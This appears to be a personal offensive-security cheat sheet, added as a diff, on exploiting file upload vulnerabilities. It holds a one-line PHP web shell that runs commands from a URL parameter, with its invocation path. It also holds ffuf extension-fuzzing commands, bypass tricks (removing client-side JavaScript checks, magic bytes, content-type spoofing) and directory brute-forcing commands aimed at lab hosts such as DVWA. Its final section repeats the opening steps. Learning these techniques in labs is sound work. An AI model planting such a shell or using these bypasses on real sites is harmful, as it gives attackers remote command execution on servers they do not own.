@@ -1,0 +1,37 @@
+File Upload Vulnerabilities:
+
+* Common PHP Shell:
+▶ Open a php file <?php system($_GET['cmd']); ?>
+▶ exploit : /uploads/shell.php?cmd=
+
+
+* File Uploading Extention Check and uploading and directory Searching:
+▶ Target your Target and find the uploading option if you find thats great
+▶ Then try to upload image file and intercept it with burp and save request as a txt file  filename="abc.FUZZ" Content-Type: image/jpeg
+▶ ffuf -request req.txt -request-proto http -w /SecLists/Fuzzing/extentions-most-common.fuzz.txt
+▶ ffuf -request req.txt -request-proto http -w /SecLists/Fuzzing/extentions-most-common.fuzz.txt ms <size>
+▶ if You find that any kind of file uploader try to file upload and then Open in New tab.
+▶ And then try to Directory Searching by dirsearch/gobuster/wfuzz/Dirb
+
+* Tips:
+▶ if you find any kind of js file try to remove it from burp . then you may upload php file
+▶ Change File Type and Finding the Correct FIletype via burp and ffuf
+▶ Add pic/jpg/png/gif file signatures in 1st line of the file
+▶ Add Magic Byte in 1st line of the file
+▶ Find the real content type is : image/jpg, image/png, text/css, application/x-php more is \seclists\Miscellaneous\web\content-type.txt
+
+* Directory Search
+▶ dirsearch -u <link>
+▶ wfuzz -c -W /usr/share/wfuzz/wordlist/dir/common.txt --hc 400,404,403 http://192.168.1.5/dvwa/FUZZ
+▶ dirb http://192.168.1.5/dvwa
+▶ gobuster dir -u <ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+▶ gobuster dir -u wgel.thm -w /usr/share/wordlists/dirb/common.txt
+
+Note: Recall Cyber 360 Youtube_merged.pdf and File Upload Vulnerabilities.pdf those files
+
+File Uploading :
+
+--> Target your Target and find the uploading option if you find thats great
+--> Then try to upload image file and intercept it with burp and save request as a txt file  filename="abc.FUZZ" Content-Type: image/jpeg
+--> ffuf -request req.txt -request-proto http -w /SecLists/Fuzzing/extentions-most-common.fuzz.txt
+--> ffuf -request req.txt -request-proto http -w /SecLists/Fuzzing/extentions-most-common.fuzz.txt ms <size>
